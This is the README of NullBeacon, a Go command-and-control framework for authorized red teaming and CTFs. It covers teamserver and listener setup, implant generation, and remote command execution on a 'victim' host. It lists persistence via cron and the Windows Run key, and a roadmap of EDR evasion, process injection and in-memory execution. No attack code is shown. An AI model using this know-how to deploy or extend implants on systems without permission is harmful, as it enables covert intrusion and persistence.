# 🕸️ NullBeacon

[![Go](https://github.com/RodKast/NullBeacon/actions/workflows/go.yml/badge.svg)](https://github.com/RodKast/NullBeacon/actions/workflows/go.yml)
![Go Version](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go)
![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-lightgrey)
[![License](https://img.shields.io/badge/license-GPL%20v3-blue)](LICENSE)
![Status](https://img.shields.io/badge/status-active%20development-orange)

> A modular Command & Control (C2) framework built from scratch in Go for authorized security research, CTF competitions, and home lab red teaming.

> ⚠️ **For authorized security research, CTF, and home lab use only. Never deploy against systems you do not own or have explicit written permission to test.**

---

## 📡 Architecture

```
Operator Terminal
      │
      ▼
 NullBeacon Teamserver
      │
      ├──► ListenerManager
      │         ├── TCP  Listener  ◄──── Agent beacon
      │         ├── TLS  Listener  ◄──── Agent beacon (encrypted)
      │         └── HTTP Listener  (upcoming)
      │
      ├──► Agent Registry (UUID, hostname, username, last seen)
      ├──► Task Queue (per agent, delivered on next beacon)
      └──► teamserver.log
```

| Component | Role |
|---|---|
| `teamserver` | Core server — listeners, agents, task queue, operator shell |
| `listener` | Pluggable protocol listeners (TCP, TLS, HTTP) |
| `agent` | Implant — beacons home, executes tasks, returns output |
| `tls.go` | Self-signed TLS certificate generation |
| `generate.go` | Cross-compiles agent binaries for Linux / Windows |

---

## 📁 Project Structure

```
go-c2/
├── cmd/
│   ├── teamserver/
│   │   ├── main.go         # Entry point, banner, operator shell
│   │   ├── handlers.go     # Agent connection and task delivery
│   │   ├── listeners.go    # Listener start/stop/list
│   │   ├── agents.go       # Agent list, interact shell, remove
│   │   ├── generate.go     # Agent binary generation
│   │   ├── tls.go          # TLS certificate generation
│   │   └── help.go         # Help menu
│   └── agent/
│       └── main.go         # Implant — beacon loop, task execution
├── pkg/
│   ├── agent/              # Agent struct (ID, hostname, tasks, last seen)
│   ├── listener/           # Listener struct with Start / StartTLS methods
│   ├── task/               # Task struct and status tracking
│   └── transport/          # (upcoming) HTTP transport
├── .github/
│   └── workflows/
│       └── go.yml          # CI — build and test on every push
├── go.mod
├── go.sum
└── teamserver.log          # Runtime log (gitignored)
```

---

## ⚙️ Installation

**Requirements:** Go 1.21+

```bash
git clone https://github.com/RodKast/NullBeacon.git
cd NullBeacon
go mod tidy
```

---

## 🚀 Quick Start

**1. Start the teamserver:**
```bash
go run ./cmd/teamserver
```

**2. Start a listener:**
```
nullbeacon> listen tls --lhost 0.0.0.0 --lport 8443
```

**3. Generate an agent:**
```
nullbeacon> generate --os linux --arch amd64 --lhost <your_ip> --lport 8443
```

**4. Deploy and run the agent on the target machine.**

**5. Interact with the agent:**
```
nullbeacon> list
nullbeacon> interact <agentID>
[agent:abc12345]> whoami
```

Logs are written to `teamserver.log`. Monitor in a separate terminal:
```bash
tail -f teamserver.log
```

---

## 🖥️ Operator Shell Reference

### Listeners

| Command | Description |
|---|---|
| `listen tcp --lhost 0.0.0.0 --lport 8080` | Start a plain TCP listener |
| `listen tls --lhost 0.0.0.0 --lport 8443` | Start an encrypted TLS listener |
| `listeners` | List all active listeners |
| `stop <listenerID>` | Stop and remove a listener |

### Agents

| Command | Description |
|---|---|
| `list` | List all connected agents with last seen timestamp |
| `interact <agentID>` | Enter the agent shell |
| `remove <agentID>` | Remove a dead agent from the list |
| `generate --os <os> --arch <arch> --lhost <ip> --lport <port>` | Generate an agent binary |

### Agent Shell

| Command | Description |
|---|---|
| `<any command>` | Queue a task and wait for output |
| `tasks` | List all tasks and their output |
| `back` | Return to the main shell |

### General

| Command | Description |
|---|---|
| `help` | Show the help menu |
| `exit` | Exit NullBeacon |

---

## 💡 Example Session

```
nullbeacon> listen tls --lhost 0.0.0.0 --lport 8443
started listener a1b2c3d4 on 0.0.0.0:8443

nullbeacon> generate --os linux --arch amd64 --lhost 10.0.0.1 --lport 8443
[*] generating linux/amd64 agent...
[+] agent saved: /home/operator/GHOST_COBRA.elf (ID: 3f9a1b2c)

nullbeacon> list
Connected agents:
ID: 3f9a1b2c, Username: victim, Hostname: target-pc, Address: 10.0.0.5:51234, Last Seen: 2026-06-21 16:42:42

nullbeacon> interact 3f9a1b2c
[agent:3f9a1b2c]> whoami
[*] task queued (waiting for output...)
output: victim
[agent:3f9a1b2c]> tasks
[3f9a1b2c] whoami → completed: victim
[agent:3f9a1b2c]> back

nullbeacon> stop a1b2c3d4
stopped listener a1b2c3d4

nullbeacon> exit
```

---

## ✅ Features

### Core
- [x] TCP and TLS listeners with concurrent agent handling
- [x] Read timeout protection against hung connections
- [x] Agent check-in with hostname and username
- [x] UUID-based agent registration
- [x] Mutex-protected agent and listener maps for concurrent access
- [x] Persistent agent ID baked in at build time via `ldflags`
- [x] Returning beacon detection — no duplicate registration
- [x] Task queuing per agent, delivered on next beacon
- [x] Shell command execution on agent (`os/exec`)
- [x] Multi-line task output flattened and returned to operator
- [x] Real-time output polling in operator shell

### Operator Experience
- [x] NullBeacon ASCII banner with colored output (`fatih/color`)
- [x] readline-powered prompt with command history (`chzyer/readline`)
- [x] New agent notification printed to terminal on first check-in
- [x] Last Seen timestamp updated on every beacon
- [x] Agent removal command (`remove <agentID>`)
- [x] Colored help menu with full command reference
- [x] Log redirection to file — clean operator terminal
- [x] Teamserver split into focused files per responsibility

### Listener Management
- [x] Dynamic listener start/stop/list at runtime
- [x] Context-based listener cancellation (`context.WithCancel`)
- [x] TCP and TLS listener support
- [x] Self-signed TLS certificate generated on startup

### Agent Generation
- [x] Cross-compilation for Linux and Windows (`GOOS`/`GOARCH`)
- [x] Agent saves to operator's current working directory
- [x] Random hacking-themed agent filenames (e.g. `GHOST_COBRA.elf`)
- [x] Debug symbols stripped from binaries (`-s -w`)

### OPSEC
- [x] Sleep jitter — randomized beacon interval (8-12 seconds)
- [x] Encrypted C2 channel via TLS
- [x] Agent retry loop — no crashes on connection failure

### Persistence
- [x] Linux — cron `@reboot` entry with current executable path
- [x] Windows — registry `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- [x] macOS stub — no-op for development builds
- [x] OS-specific build files (`_linux.go`, `_windows.go`, `_other.go`)

---

## 🗺️ Roadmap

### ✅ Completed
- [x] Stage 1 — TCP teamserver skeleton
- [x] Stage 2 — Agent check-in with system info
- [x] Stage 3 — Beacon loop
- [x] Stage 4 — Agent registration with UUID and mutex-protected map
- [x] Stage 5 — Operator shell (list agents, queue tasks)
- [x] Stage 6 — Persistent agent ID + task delivery on beacon
- [x] Stage 7 — Command execution on agent side + output return
- [x] Stage 7.5 — NullBeacon CLI (readline, colors, banner)
- [x] Stage 7.6 — Dynamic listener management (start/stop/list)
- [x] Stage 7.7 — Agent generation with cross-compilation and themed names
- [x] Stage 7.8 — Help menu and teamserver refactor into focused files
- [x] Stage 7.9 — Agent reliability (retry loop, multi-line output, no fatal crashes)
- [x] Stage 7.10 — Operator UX (agent notifications, timestamps, remove command)
- [x] Stage 7.11 — Basic OPSEC (strip symbols, sleep jitter)
- [x] Stage 7.12 — TLS transport (encrypted C2 channel)
- [x] Stage 8 — Persistence (Linux cron @reboot, Windows registry Run key)

### 🔨 In Progress
- [ ] Stage 9 — Evasion (AMSI/ETW stubs, sleep obfuscation)

### 📋 Planned
- [ ] Stage 10 — Packing (AES payload encryption, custom loaders)
- [ ] Stage 11 — Transport hardening (HTTP listener, malleable profiles)

### 🥷 Stealth Roadmap (Post Stage 11)
- [ ] Stage 12 — Process injection (execute inside legitimate processes)
- [ ] Stage 13 — Living off the Land (LOLBins — use built-in OS tools)
- [ ] Stage 14 — Malleable C2 profiles (traffic mimics Google/Microsoft)
- [ ] Stage 15 — Syscall obfuscation (bypass EDR user-mode hooks)
- [ ] Stage 16 — In-memory execution (never touch disk)

---

## 🤝 Contributing

This is a learning project but contributions and feedback are welcome. Open an issue or PR on GitHub.

---

## 📄 License

GPL v3 License — see [LICENSE](LICENSE) for details.

---

## ⚠️ Disclaimer

This project is built for **educational purposes**, **CTF competitions**, and **authorized security research**. The authors are not responsible for misuse. Always obtain explicit written permission before testing against any system you do not own.
